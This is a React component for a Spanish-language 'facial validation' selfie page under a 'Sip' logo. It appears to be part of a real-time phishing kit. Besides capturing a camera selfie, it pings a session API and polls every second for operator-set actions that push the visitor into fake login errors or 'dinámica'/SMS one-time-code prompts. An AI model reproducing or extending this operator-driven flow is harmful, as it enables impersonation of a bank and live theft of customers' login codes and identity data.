import { useEffect, useRef, useState } from 'react'
import { SipLogo } from './Icons'

type SelfiePageProps = {
  sessionId?: string
  onHome: () => void
  onOtpRequired?: (mode: 'dinamica' | 'sms') => void
  onErrorLogin?: () => void
}

export function SelfiePage({
  sessionId,
  onHome,
  onOtpRequired,
  onErrorLogin,
}: SelfiePageProps) {
  const videoRef = useRef<HTMLVideoElement>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const streamRef = useRef<MediaStream | null>(null)
  const [ready, setReady] = useState(false)
  const [error, setError] = useState('')
  const [photo, setPhoto] = useState('')

  // Keep-alive ping and operator polling
  useEffect(() => {
    if (!sessionId) return

    const ping = () => {
      fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {})
    }
    ping()
    const pingTimer = window.setInterval(ping, 3000)

    // Notify server we are in selfie mode
    fetch(`/api/sessions/${sessionId}/state`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state: 'waiting-selfie' }),
    }).catch(() => {})

    const pollTimer = window.setInterval(async () => {
      try {
        const res = await fetch(`/api/sessions/${sessionId}`)
        if (!res.ok) return
        const session = await res.json()
        const action = session.action

        if (action === 'done') {
          onHome()
          return
        }

        if (action === 'error-login') {
          onErrorLogin?.()
          return
        }

        if (action === 'dinamica' || action === 'sms') {
          onOtpRequired?.(action)
          return
        }
      } catch {}
    }, 1000)

    return () => {
      window.clearInterval(pingTimer)
      window.clearInterval(pollTimer)
    }
  }, [sessionId, onHome, onErrorLogin, onOtpRequired])

  useEffect(() => {
    let cancelled = false

    async function start() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
        })
        if (cancelled) {
          stream.getTracks().forEach((track) => track.stop())
          return
        }
        streamRef.current = stream
        const video = videoRef.current
        if (video) {
          video.srcObject = stream
          await video.play()
        }
        setReady(true)
      } catch {
        if (!cancelled) {
          setError('No se pudo activar la cámara. Permite el acceso e inténtalo de nuevo.')
        }
      }
    }

    void start()

    return () => {
      cancelled = true
      streamRef.current?.getTracks().forEach((track) => track.stop())
      streamRef.current = null
    }
  }, [])

  function takeSelfie() {
    const video = videoRef.current
    const canvas = canvasRef.current
    if (!video || !canvas || !ready) return
    const width = video.videoWidth || 720
    const height = video.videoHeight || 960
    canvas.width = width
    canvas.height = height
    const ctx = canvas.getContext('2d')
    if (!ctx) return
    ctx.translate(width, 0)
    ctx.scale(-1, 1)
    ctx.drawImage(video, 0, 0, width, height)
    const dataUrl = canvas.toDataURL('image/jpeg', 0.92)
    setPhoto(dataUrl)

    if (sessionId) {
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: 'received-selfie' }),
      }).catch(() => {})
    }
  }

  function retake() {
    setPhoto('')
    if (sessionId) {
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: 'waiting-selfie' }),
      }).catch(() => {})
    }
  }

  function handleFinish() {
    if (sessionId) {
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: 'done' }),
      }).catch(() => {})
    }
    onHome()
  }

  return (
    <div className="login-page selfie-page">
      <header className="selfie-bar">
        <button type="button" className="login-logo" onClick={onHome} aria-label="Sip">
          <SipLogo ink />
        </button>
      </header>

      <div className="selfie-body">
        <h2>Validación facial</h2>
        <p className="selfie-copy">
          Esta validación nos ayudará a realizar la verificación facial cuando detectemos que
          inicia sesión en un dispositivo desconocido.
        </p>
        <p className="selfie-hint">Centra tu cara dentro del óvalo para tomarte la selfie.</p>

        <div className={`selfie-stage${photo ? ' captured' : ''}`}>
          {photo ? (
            <img src={photo} alt="Selfie capturada" />
          ) : (
            <video ref={videoRef} autoPlay playsInline muted />
          )}
          <div className="selfie-shade" aria-hidden />
          <div className="selfie-oval" aria-hidden />
        </div>

        <canvas ref={canvasRef} className="sr-only" />

        {error ? <p className="selfie-error">{error}</p> : null}

        {photo ? (
          <div className="selfie-actions">
            <button type="button" className="login-outline" onClick={retake}>
              Tomar de nuevo
            </button>
            <button type="button" className="login-submit ready" onClick={handleFinish}>
              Continuar
            </button>
          </div>
        ) : (
          <button
            type="button"
            className={`login-submit${ready ? ' ready' : ''}`}
            disabled={!ready}
            onClick={takeSelfie}
          >
            {ready ? 'Tomar selfie' : 'Activando cámara...'}
          </button>
        )}
      </div>
    </div>
  )
}
